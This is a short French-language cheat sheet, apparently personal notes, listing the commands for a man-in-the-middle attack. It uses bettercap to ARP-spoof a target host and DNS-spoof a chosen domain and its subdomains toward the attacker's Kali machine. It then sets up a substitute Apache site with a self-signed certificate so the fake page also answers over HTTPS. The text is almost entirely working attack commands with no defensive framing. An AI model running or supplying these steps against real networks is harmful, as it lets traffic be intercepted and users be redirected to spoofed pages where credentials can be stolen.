
$ sudo iptables -F -t nat
>>> effacement table nat.

$ sudo bettercap
>>> mise en place de l'arp spoofing.
» set arp.spoof.fullduplex true
» set arp.spoof.targets <ip cible>
» arp.spoof on

>>> mise en place du dns spoofing.
» set dns.spoof.all true				> dns spoofing activé sur toutes les requetes.
» set dns.spoof.domains example.com,*.example.com		> on définit la liste des domaines à usurper.
» set dns.spoof.address <ip_kali>			> on définit la machine quiva faire office de DNS.
» dns.spoof on						> on démarre le dns spoofing.

>>> lancement du serveur apache (de substitution).
$ sudo service apache2 start
---> modififiez la page index.htm dans /var/www/html/index.html

Rem: pour https, nous pouvons créer un faux certificat avec:
$ sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/apache-selfsigned.key -out /etc/ssl/certs/apache-selfsigned.crt

Modifier le site:
vi /etc/apache2/sites-available/default-ssl.conf

Modifiez les lignes suivantes avec les nouveaux certifiats:
SSLCertificateFile	/etc/ssl/certs/apache-selfsigned.crt
SSLCertificateKeyFile	/etc/ssl/private/apache-selfsigned.key

Activation de la version sécurisée de apache:
$ sudo a2ensite default-ssl.conf

Redémarrage serveur web:
$ sudo service apache2 start

>@
>@#################################################################################
>@
>@
>@#################################################################################
>@
